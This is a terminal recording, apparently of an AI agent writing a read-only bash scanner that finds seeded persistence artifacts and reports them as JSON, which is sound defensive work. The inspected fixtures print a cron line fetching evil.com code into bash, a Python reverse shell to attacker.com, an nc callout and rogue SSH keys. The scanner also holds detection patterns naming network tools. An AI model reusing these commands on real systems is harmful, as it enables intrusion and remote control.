@@ -1,0 +1,581 @@
+[?2004hroot@f34d46d42750:/app# asciinema rec --stdin /logs/agent/recording.cast
+[?2004l[0;32masciinema: recording asciicast to /logs/agent/recording.cast[0m
+[0;32masciinema: press <ctrl-d> or type "exit" when you're done[0m
+[?2004hroot@f34d46d42750:/app# clear
+[?2004l[H[J[?2004hroot@f34d46d42750:/app# ls -la /app /app_target 2>&1; echo ---; ls -la /etc/cron.d /etc/crontab /var/spool/cron/crontabs 2>&1; echo ---; ls -la /etc/systemd/system /usr/lib/systemd/system /run/systemd/system 2>&1 | head -50; echo ---; ls -la /etc/rc.local /etc/rc.d 2>&1; echo ---; ls -la /home /root/.ssh 2>&1; echo ---; which sha256sum realpath python3 jq
+[?2004l/app:
+total 8
+drwxr-xr-x 2 root root 4096 Oct 25 21:37 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Oct 26 00:29 [01;34m..[0m
+
+/app_target:
+total 20
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 [01;34m.[0m
+drwxr-xr-x 1 root root 4096 Oct 26 00:29 [01;34m..[0m
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 [01;34metc[0m
+drwxr-xr-x 3 root root 4096 Oct 25 21:38 [01;34mhome[0m
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 [01;34mscripts[0m
+---
+-rw-r--r-- 1 root root    1136 Mar 23  2022 /etc/crontab
+
+/etc/cron.d:
+total 20
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Oct 26 00:28 [01;34m..[0m
+-rw-r--r-- 1 root root  102 Mar 23  2022 .placeholder
+-rw-r--r-- 1 root root   89 Oct 25 21:38 backdoor_cron
+-rw-r--r-- 1 root root  202 Jan  8  2022 e2scrub_all
+
+/var/spool/cron/crontabs:
+total 12
+drwx-wx--T 1 root crontab 4096 Oct 25 21:38 [37;44m.[0m
+drwxr-xr-x 1 root root    4096 Oct 25 21:38 [01;34m..[0m
+-rw-r--r-- 1 root root      77 Oct 25 21:38 root
+---
+ls: cannot access '/run/systemd/system': No such file or directory
+/etc/systemd/system:
+total 28
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 .
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 ..
+lrwxrwxrwx 1 root root   44 Oct 25 21:38 dbus-org.freedesktop.resolve1.service -> /lib/systemd/system/systemd-resolved.service
+lrwxrwxrwx 1 root root   45 Oct 25 21:38 dbus-org.freedesktop.timesync1.service -> /lib/systemd/system/systemd-timesyncd.service
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 getty.target.wants
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 multi-user.target.wants
+-rw-r--r-- 1 root root  225 Oct 25 21:38 persistence.service
+lrwxrwxrwx 1 root root   31 Oct 25 21:38 sshd.service -> /lib/systemd/system/ssh.service
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 sysinit.target.wants
+drwxr-xr-x 2 root root 4096 Sep 30 02:08 timers.target.wants
+
+/usr/lib/systemd/system:
+total 796
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 .
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 ..
+-rw-r--r-- 1 root root  256 Oct 25 21:38 .hidden_service.service
+-rw-r--r-- 1 root root  389 Oct 22  2024 apt-daily-upgrade.service
+-rw-r--r-- 1 root root  184 Oct 22  2024 apt-daily-upgrade.timer
+-rw-r--r-- 1 root root  326 Oct 22  2024 apt-daily.service
+-rw-r--r-- 1 root root  156 Oct 22  2024 apt-daily.timer
+lrwxrwxrwx 1 root root   14 Oct 12 07:44 autovt@.service -> getty@.service
+-rw-r--r-- 1 root root  927 Mar 11  2022 basic.target
+-rw-r--r-- 1 root root  449 Mar 11  2022 blockdev@.target
+-rw-r--r-- 1 root root  435 Mar 11  2022 bluetooth.target
+-rw-r--r-- 1 root root  463 Mar 11  2022 boot-complete.target
+-rw-r--r-- 1 root root 1073 Oct 12 07:44 console-getty.service
+-rw-r--r-- 1 root root 1254 Oct 12 07:44 container-getty@.service
+-rw-r--r-- 1 root root  319 Mar 17  2021 cron.service
+lrwxrwxrwx 1 root root    9 Oct 12 07:44 cryptdisks-early.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Oct 12 07:44 cryptdisks.service -> /dev/null
+-rw-r--r-- 1 root root  473 Mar 11  2022 cryptsetup-pre.target
+-rw-r--r-- 1 root root  420 Mar 11  2022 cryptsetup.target
+lrwxrwxrwx 1 root root   13 Oct 12 07:44 ctrl-alt-del.target -> reboot.target
+lrwxrwxrwx 1 root root   25 Oct 12 07:44 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
+lrwxrwxrwx 1 root root   23 Oct 12 07:44 dbus-org.freedesktop.locale1.service -> systemd-localed.service
+lrwxrwxrwx 1 root root   22 Oct 12 07:44 dbus-org.freedesktop.login1.service -> systemd-logind.service
+lrwxrwxrwx 1 root root   25 Oct 12 07:44 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
+-rw-r--r-- 1 root root  498 Oct 25  2022 dbus.service
+-rw-r--r-- 1 root root  193 Oct 25  2022 dbus.socket
+-rw-r--r-- 1 root root 1065 Oct 12 07:44 debug-shell.service
+lrwxrwxrwx 1 root root   16 Oct 12 07:44 default.target -> graphical.target
+-rw-r--r-- 1 root root  758 Mar 11  2022 dev-hugepages.mount
+-rw-r--r-- 1 root root  701 Mar 11  2022 dev-mqueue.mount
+-rw-r--r-- 1 root root  147 Dec  5  2021 dpkg-db-backup.service
+-rw-r--r-- 1 root root  138 Dec  5  2021 dpkg-db-backup.timer
+-rw-r--r-- 1 root root  438 Oct  9  2023 e2scrub@.service
+-rw-r--r-- 1 root root  297 Oct  9  2023 e2scrub_all.service
+---
+-rwxr-xr-x 1 root root   48 Oct 25 21:38 [0m[01;32m/etc/rc.local[0m
+
+/etc/rc.d:
+total 8
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 [01;34m.[0m
+drwxr-xr-x 1 root root 4096 Oct 26 00:28 [01;34m..[0m
+---
+/home:
+total 12
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Oct 26 00:29 [01;34m..[0m
+drwxr-xr-x 3 root root 4096 Oct 25 21:38 [01;34mtestuser[0m
+
+/root/.ssh:
+total 12
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 [01;34m.[0m
+drwx------ 1 root root 4096 Oct 26 00:28 [01;34m..[0m
+-rw-r--r-- 1 root root  129 Oct 25 21:38 authorized_keys
+---
+/usr/bin/sha256sum
+/usr/bin/realpath
+/usr/bin/python3
+/usr/bin/jq
+[?2004hroot@f34d46d42750:/app# find /app_target -maxdepth 6 -printf '%M %p\n' 2>&1 | head -100; echo ---; cat /etc/cron.d/backdoor_cron; echo ---; cat /var/spool/cron/crontabs/root; echo ---; cat /etc/systemd/system/persistence.service; echo ---; cat /usr/lib/systemd/system/.hidden_service.service; echo ---; cat /etc/rc.local; echo ---; cat /root/.ssh/authorized_keys; echo ---; ls -la /home/testuser /home/testuser/.ssh 2>&1
+[?2004ldrwxr-xr-x /app_target
+drwxr-xr-x /app_target/scripts
+-rw-r--r-- /app_target/scripts/evil.sh
+drwxr-xr-x /app_target/etc
+-rwxr-xr-x /app_target/etc/rc.local
+drwxr-xr-x /app_target/etc/cron.d
+-rw-r--r-- /app_target/etc/cron.d/app_cron
+drwxr-xr-x /app_target/etc/systemd
+drwxr-xr-x /app_target/etc/systemd/system
+-rw-r--r-- /app_target/etc/systemd/system/app_backdoor.service
+drwxr-xr-x /app_target/home
+drwxr-xr-x /app_target/home/victim
+drwxr-xr-x /app_target/home/victim/.ssh
+-rw-r--r-- /app_target/home/victim/.ssh/authorized_keys
+---
+* * * * * root /tmp/malicious_cron.sh
+0 2 * * * user /usr/local/bin/suspicious_backup.sh
+---
+# Malicious cron entry
+*/5 * * * * curl -s http://evil.com/payload.sh | bash
+---
+[Unit]
+Description=System Persistence Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c "while true; do /tmp/.hidden_backdoor.sh; sleep 60; done"
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+
+---
+[Unit]
+Description=Hidden Service
+[Service]
+ExecStart=/usr/bin/python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
+
+---
+#!/bin/bash
+# Standard rc.local content
+exit 0
+
+---
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...
+# Legitimate key
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... malicious@backdoor
+---
+/home/testuser:
+total 12
+drwxr-xr-x 3 root root 4096 Oct 25 21:38 [0m[01;34m.[0m
+drwxr-xr-x 1 root root 4096 Oct 25 21:38 [01;34m..[0m
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 [01;34m.ssh[0m
+
+/home/testuser/.ssh:
+total 12
+drwxr-xr-x 2 root root 4096 Oct 25 21:38 [01;34m.[0m
+drwxr-xr-x 3 root root 4096 Oct 25 21:38 [01;34m..[0m
+-rw-r--r-- 1 root root  115 Oct 25 21:38 authorized_keys
+[?2004hroot@f34d46d42750:/app# for f in $(find /app_target -type f 2>/dev/null | head -50); do echo "== $f"; head -c 400 "$f"; echo; done 2>&1 | head -300
+[?2004l== /app_target/scripts/evil.sh
+
+== /app_target/etc/rc.local
+#!/bin/bash
+# Modified rc.local with backdoor
+/tmp/startup_backdoor.sh &
+exit 0
+
+
+== /app_target/etc/cron.d/app_cron
+0 0 * * * root /app_target/scripts/evil.sh
+
+== /app_target/etc/systemd/system/app_backdoor.service
+[Unit]
+Description=Application Backdoor Service
+[Service]
+ExecStart=/bin/sh -c 'echo "backdoor" | nc attacker.com 1234'
+
+
+== /app_target/home/victim/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXK8...
+
+[?2004hroot@f34d46d42750:/app# cat > /app/scan_persistence.sh <<'EOF'
+[?2004l[?2004h> #!/bin/bash
+[?2004l[?2004h> # Read-only scanner for seeded persistence artifacts; writes /app/persistence_report.json
+[?2004l[?2004h> set -u
+[?2004l[?2004h> set -f
+[?2004l[?2004h> shopt -s nullglob
+[?2004l[?2004h> OUT=/app/persistence_report.json
+[?2004l[?2004h> TMP=$(mktemp) || exit 0
+[?2004l[?2004h> trap 'rm -f "$TMP"' EXIT
+[?2004l[?2004h> CR=$(printf '\015')
+[?2004l[?2004h> SUSP_CRON='/tmp|/var/tmp|/dev/shm|base64|eval|curl|wget|/dev/tcp|(^|[[:space:]])nc[[:space:]]|netcat|bash -i|sh -i'
+[?2004l[?2004h> SUSP_EXEC='/tmp|/var/tmp|/dev/shm|base64|eval|curl|wget|/dev/tcp|(^|[[:space:]])nc[[:space:]]|netcat|ncat|sh -[ci]|python[0-9.]* -c|socket|subprocess|perl -e' M[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K'
+[?2004l[?2004h> 
+[?2004l[?2004h> emit() {
+[?2004l[?2004h>   jq -cn --arg t "$1" --arg p "$2" --arg s "$3" --argjson l "$4" --arg c "$5" --arg u "$6" '{type:$t, path:$p, sha256:$s, details:{line_number:$l, content_preview:($c | .[0:100]), user:(if ($u|length)==0 then null else $u end)}}' >> "$TMP"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> sha_of() { sha256sum "$1" 2>/dev/null | awk '{print $1}'; }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_cron() {
+[?2004l[?2004h>   local f=$1 user=$2 real sha n=0 line t susp tok
+[?2004l[?2004h>   real=$(realpath -e "$f" 2>/dev/null) || return 0
+[?2004letails.content_preview]) | sort_by([.type, .path])) as $a
+  | {
+      summary: {
+        total_artifacts: ($a | length),
+        cron_jobs: ([$a[] | select(.type == "cron_job")] | length),
+        systemd_units: ([$a[] | select(.type == "systemd_unit")] | length),
+        rc_local_modifications: ([$a[] | select(.type == "rc_local")] | length),
+        ssh_keys: ([$a[] | select(.type == "ssh_key")] | length)
+      },
+      artifacts: $a
+    }' "$TMP" > "$OUT"
+
+exit 0
+EOF
+chmod +x /app/scan_persistence.sh && bash -n /app/scan_persistence.sh && echo SYNTAX_OK
+[?2004h>   [ -f "$real" ] && [ -r "$real" ] || return 0
+[?2004l[?2004h>   sha=$(sha_of "$real")
+[?2004l[?2004h>   while IFS= read -r line || [ -n "$line" ]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     line=${line%$CR}
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     case "$t" in ''|'#'*) continue ;; esac
+[?2004l[?2004h>     if [[ $t =~ ^[A-Za-z_][A-Za-z0-9_]*= ]]; then continue; fi
+[?2004l[?2004h>     susp=0
+[?2004l[?2004h>     if printf '%s\n' "$t" | grep -qE "$SUSP_CRON"; then susp=1; fi
+[?2004l[?2004h>     if printf '%s\n' "$t" | grep -qE '^[*][[:space:]]+[*][[:space:]]+[*][[:space:]]+[*][[:space:]]+[*]([[:space:]]|$)'; then susp=1; fi
+[?2004l[?2004h>     for tok in $t; do
+[?2004l[?2004h>       case "$tok" in
+[?2004l[?2004h>         /usr/bin/*|/bin/*|/sbin/*|/usr/sbin/*|/etc/*|/) ;;
+[?2004l[?2004h>         /*) susp=1 ;;
+[?2004l[?2004h>       esac
+[?2004l[?2004h>     done
+[?2004l[?2004h>     if [ "$susp" -eq 1 ]; then emit cron_job "$real" "$sha" "$n" "$t" "$user"; fi
+[?2004l[?2004h>   done < "$real"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_unit() {
+[?2004l[?2004h>   local f=$1 real sha name hidden=0 susp=0 hit prev
+[?2004l[?2004h>   real=$(realpath -e "$f" 2>/dev/null) || return 0
+[?2004l[?2004h>   [ -f "$real" ] && [ -r "$real" ] || return 0
+[?2004l[?2004h>   name=$(basename "$f")
+[?2004l[?2004h>   if [[ $name == .* ]]; then hidden=1; fi
+[?2004l[?2004h>   sha=$(sha_of "$real")
+[?2004l[?2004h>   hit=$(grep -nE '^[[:space:]]*Exec[A-Za-z]*[[:space:]]*=' "$real" 2>/dev/null | grep -E "$SUSP_EXEC" | head -n1)
+[?2004l[?2004h>   if [ -n "$hit" ]; then
+[?2004l[?2004h>     susp=1
+[?2004l[?2004h>     prev=${hit#*:}
+[?2004l[?2004h>   else
+[?2004l[?2004h>     prev=$(grep -m1 -E '^[[:space:]]*Exec' "$real" 2>/dev/null)
+[?2004l[?2004h>     if [ -z "$prev" ]; then prev=$(head -n1 "$real" 2>/dev/null); fi
+[?2004l[?2004h>   fi
+[?2004l[?2004h>   if [ "$hidden" -eq 1 ]; then susp=1; fi
+[?2004l[?2004h>   if [ "$susp" -eq 1 ]; then emit systemd_unit "$real" "$sha" null "$prev" ""; fi
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_rc() {
+[?2004l[?2004h>   local f=$1 real sha n=0 line t
+[?2004l[?2004h>   real=$(realpath -e "$f" 2>/dev/null) || return 0
+[?2004l[?2004h>   [ -f "$real" ] && [ -r "$real" ] || return 0
+[?2004l[?2004h>   sha=$(sha_of "$real")
+[?2004l[?2004h>   while IFS= read -r line || [ -n "$line" ]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     line=${line%$CR}
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     case "$t" in ''|'#'*|'exit 0') continue ;; esac
+[?2004l[?2004h>     emit rc_local "$real" "$sha" "$n" "$t" ""
+[?2004l[?2004h>   done < "$real"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> scan_ssh() {
+[?2004l[?2004h>   local f=$1 user=$2 real sha n=0 line t
+[?2004l[?2004h>   real=$(realpath -e "$f" 2>/dev/null) || return 0
+[?2004l[?2004h>   [ -f "$real" ] && [ -r "$real" ] || return 0
+[?2004l[?2004h>   sha=$(sha_of "$real")
+[?2004l[?2004h>   while IFS= read -r line || [ -n "$line" ]; do
+[?2004l[?2004h>     n=$((n+1))
+[?2004l[?2004h>     line=${line%$CR}
+[?2004l[?2004h>     t=${line#"${line%%[![:space:]]*}"}
+[?2004l[?2004h>     case "$t" in ''|'#'*) continue ;; esac
+[?2004l[?2004h>     emit ssh_key "$real" "$sha" "$n" "$t" "$user"
+[?2004l[?2004h>   done < "$real"
+[?2004l[?2004h> }
+[?2004l[?2004h> 
+[?2004l[?2004h> BASES=()
+[?2004l[?2004h> if [ -d /app_target ]; then BASES+=(/app_target); fi
+[?2004l[?2004h> BASES+=("")
+[?2004l[?2004h> for b in "${BASES[@]}"; do
+[?2004l[?2004h>   scan_cron "$b/etc/crontab" ""
+[?2004l[?2004h>   while IFS= read -r f; do scan_cron "$f" ""; done < <(find -L "$b/etc/cron.d" -maxdepth 1 -type f 2>/dev/null | sort)
+[?2004l[?2004h>   for f in "$b"/var/spool/cron/crontabs/*; do
+[?2004l[?2004h>     if [ -f "$f" ]; then scan_cron "$f" "$(basename "$f")"; fi
+[?2004l[?2004h>   done
+[?2004l[?2004h>   for d in etc/systemd/system usr/lib/systemd/system run/systemd/system; do
+[?2004l[?2004h>     while IFS= read -r f; do scan_unit "$f"; done < <(find -L "$b/$d" -maxdepth 1 -type f 2>/dev/null | sort)
+[?2004l[?2004h>   done
+[?2004l[?2004h>   scan_rc "$b/etc/rc.local"
+[?2004l[?2004h>   scan_rc "$b/etc/rc.d/rc.local"
+[?2004l[?2004h>   scan_ssh "$b/root/.ssh/authorized_keys" "root"
+[?2004l[?2004h>   for h in "$b"/home/*/; do
+[?2004l[?2004h>     scan_ssh "${h}.ssh/authorized_keys" "$(basename "$h")"
+[?2004l[?2004h>   done
+[?2004l[?2004h> done
+[?2004l[?2004h> 
+[?2004l[?2004h> jq --indent 2 -s '
+[?2004l[?2004h>   (unique_by([.type, .path, .details.line_number, .details.content_preview]) | sort_by([.type, .path])) as $a
+[?2004l[?2004h>   | {
+[?2004l[?2004h>       summary: {
+[?2004l[?2004h>         total_artifacts: ($a | length),
+[?2004l[?2004h>         cron_jobs: ([$a[] | select(.type == "cron_job")] | length),
+[?2004l[?2004h>         systemd_units: ([$a[] | select(.type == "systemd_unit")] | length),
+[?2004l[?2004h>         rc_local_modifications: ([$a[] | select(.type == "rc_local")] | length),
+[?2004l[?2004h>         ssh_keys: ([$a[] | select(.type == "ssh_key")] | length)
+[?2004l[?2004h>       },
+[?2004l[?2004h>       artifacts: $a
+[?2004l[?2004h>     }' "$TMP" > "$OUT"
+[?2004l[?2004h> 
+[?2004l[?2004h> exit 0
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@f34d46d42750:/app# chmod +x /app/scan_persistence.sh && bash -n /app/scan_persistence.sh && echo SYNTAX_OK
+[?2004lSYNTAX_OK
+[?2004hroot@f34d46d42750:/app# /app/scan_persistence.sh; echo EXIT=$?; md5sum /app/persistence_report.json; /app/scan_persistence.sh; echo EXIT=$?; md5sum /app/persistence_report.json; cat /app/persistence_report.json
+[?2004lEXIT=0
+14936f4b7cc9c8f08d2321a420e9f2d6  /app/persistence_report.json
+EXIT=0
+14936f4b7cc9c8f08d2321a420e9f2d6  /app/persistence_report.json
+{
+  "summary": {
+    "total_artifacts": 12,
+    "cron_jobs": 5,
+    "systemd_units": 4,
+    "rc_local_modifications": 1,
+    "ssh_keys": 2
+  },
+  "artifacts": [
+    {
+      "type": "cron_job",
+      "path": "/app_target/etc/cron.d/app_cron",
+      "sha256": "bff2acce2dbfa05e2ea0d8dc107adcab91e6d9b60e6ddd25707fe90a31bb4406",
+      "details": {
+        "line_number": 1,
+        "content_preview": "0 0 * * * root /app_target/scripts/evil.sh",
+        "user": null
+      }
+    },
+    {
+      "type": "cron_job",
+      "path": "/etc/cron.d/backdoor_cron",
+      "sha256": "6079a3332be5f48d7a9c2be3367c35f859f35c92f829ff7eebceb9832f4becc6",
+      "details": {
+        "line_number": 1,
+        "content_preview": "* * * * * root /tmp/malicious_cron.sh",
+        "user": null
+      }
+    },
+    {
+      "type": "cron_job",
+      "path": "/etc/cron.d/backdoor_cron",
+      "sha256": "6079a3332be5f48d7a9c2be3367c35f859f35c92f829ff7eebceb9832f4becc6",
+      "details": {
+        "line_number": 2,
+        "content_preview": "0 2 * * * user /usr/local/bin/suspicious_backup.sh",
+        "user": null
+      }
+    },
+    {
+      "type": "cron_job",
+      "path": "/etc/cron.d/e2scrub_all",
+      "sha256": "06b70de96f9f3010a1cb356f951f3051aad4434f90138aa8d4c5d8ef7a9f7818",
+      "details": {
+        "line_number": 1,
+        "content_preview": "30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/aarch64-linux-gnu/e2fsprogs/e",
+        "user": null
+      }
+    },
+    {
+      "type": "cron_job",
+      "path": "/etc/cron.d/e2scrub_all",
+      "sha256": "06b70de96f9f3010a1cb356f951f3051aad4434f90138aa8d4c5d8ef7a9f7818",
+      "details": {
+        "line_number": 2,
+        "content_preview": "10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r",
+        "user": null
+      }
+    },
+    {
+      "type": "rc_local",
+      "path": "/app_target/etc/rc.local",
+      "sha256": "3be8928ea575fc75787095fddcb464f03541e81d4dcc991a3ac46e80ef055cd3",
+      "details": {
+        "line_number": 3,
+        "content_preview": "/tmp/startup_backdoor.sh &",
+        "user": null
+      }
+    },
+    {
+      "type": "ssh_key",
+      "path": "/root/.ssh/authorized_keys",
+      "sha256": "3e6582b49d8732b9ee6407cdb83fa6ab509fe0346c6279a7dd75f24f6381e11e",
+      "details": {
+        "line_number": 1,
+        "content_preview": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA...",
+        "user": "root"
+      }
+    },
+    {
+      "type": "ssh_key",
+      "path": "/root/.ssh/authorized_keys",
+      "sha256": "3e6582b49d8732b9ee6407cdb83fa6ab509fe0346c6279a7dd75f24f6381e11e",
+      "details": {
+        "line_number": 3,
+        "content_preview": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... malicious@backdoor",
+        "user": "root"
+      }
+    },
+    {
+      "type": "systemd_unit",
+      "path": "/app_target/etc/systemd/system/app_backdoor.service",
+      "sha256": "0e5ba00a0c33da4859758eed7b0af18c8d1ad1c3fb7acf011437e228c863084a",
+      "details": {
+        "line_number": null,
+        "content_preview": "ExecStart=/bin/sh -c 'echo \"backdoor\" | nc attacker.com 1234'",
+        "user": null
+      }
+    },
+    {
+      "type": "systemd_unit",
+      "path": "/etc/systemd/system/persistence.service",
+      "sha256": "a7b556c604f0a3fe79b4559ebe499d56efddad3fa123e6fb2a84d90cbd49e004",
+      "details": {
+        "line_number": null,
+        "content_preview": "ExecStart=/bin/bash -c \"while true; do /tmp/.hidden_backdoor.sh; sleep 60; done\"",
+        "user": null
+      }
+    },
+    {
+      "type": "systemd_unit",
+      "path": "/usr/lib/systemd/system/.hidden_service.service",
+      "sha256": "65d6569d6817fefc41f465ef4f983a02b919f9d1674cf85ba476358489894707",
+      "details": {
+        "line_number": null,
+        "content_preview": "ExecStart=/usr/bin/python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('attacker.co",
+        "user": null
+      }
+    },
+    {
+      "type": "systemd_unit",
+      "path": "/usr/lib/systemd/system/kmod-static-nodes.service",
+      "sha256": "fc75378e4878af8d609471832aae6b052485bb741a140569c0060424ec867099",
+      "details": {
+        "line_number": null,
+        "content_preview": "ExecStart=/bin/kmod static-nodes --format=tmpfiles --output=/run/tmpfiles.d/static-nodes.conf",
+        "user": null
+      }
+    }
+  ]
+}
+[?2004hroot@f34d46d42750:/app# sed -i '/^set -f$/d' /app/scan_persistence.sh && bash -n /app/scan_persistence.sh && /app/scan_persistence.sh; echo EXIT=$?; md5sum /app/persistence_report.json; /app/scan_persistence.sh; echo EXIT=$?; md5sum /app/persistence_report.json; jq '.summary, [.artifacts[] | {type, path, user: .details.user, line: .details.line_number}]' /app/persistence_report.json
+[?2004lEXIT=0
+dd1c967d0a656a3d003cba331db7483b  /app/persistence_report.json
+EXIT=0
+dd1c967d0a656a3d003cba331db7483b  /app/persistence_report.json
+[1;39m{
+  [0m[34;1m"total_artifacts"[0m[1;39m: [0m[0;39m16[0m[1;39m,
+  [0m[34;1m"cron_jobs"[0m[1;39m: [0m[0;39m6[0m[1;39m,
+  [0m[34;1m"systemd_units"[0m[1;39m: [0m[0;39m4[0m[1;39m,
+  [0m[34;1m"rc_local_modifications"[0m[1;39m: [0m[0;39m1[0m[1;39m,
+  [0m[34;1m"ssh_keys"[0m[1;39m: [0m[0;39m5[0m[1;39m
+[1;39m}[0m
+[1;39m[
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"cron_job"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/app_target/etc/cron.d/app_cron"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[1;30mnull[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m1[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"cron_job"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/etc/cron.d/backdoor_cron"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[1;30mnull[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m1[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"cron_job"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/etc/cron.d/backdoor_cron"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[1;30mnull[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m2[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"cron_job"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/etc/cron.d/e2scrub_all"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[1;30mnull[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m1[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"cron_job"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/etc/cron.d/e2scrub_all"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[1;30mnull[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m2[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"cron_job"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/var/spool/cron/crontabs/root"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[0;32m"root"[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m2[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"rc_local"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/app_target/etc/rc.local"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[1;30mnull[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m3[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"ssh_key"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/app_target/home/victim/.ssh/authorized_keys"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[0;32m"victim"[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m1[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"ssh_key"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/home/testuser/.ssh/authorized_keys"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[0;32m"testuser"[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m1[0m[1;39m
+  [1;39m}[0m[1;39m,
+  [1;39m{
+    [0m[34;1m"type"[0m[1;39m: [0m[0;32m"ssh_key"[0m[1;39m,
+    [0m[34;1m"path"[0m[1;39m: [0m[0;32m"/home/testuser/.ssh/authorized_keys"[0m[1;39m,
+    [0m[34;1m"user"[0m[1;39m: [0m[0;32m"testuser"[0m[1;39m,
+    [0m[34;1m"line"[0m[1;39m: [0m[0;39m2[0m[1;39m
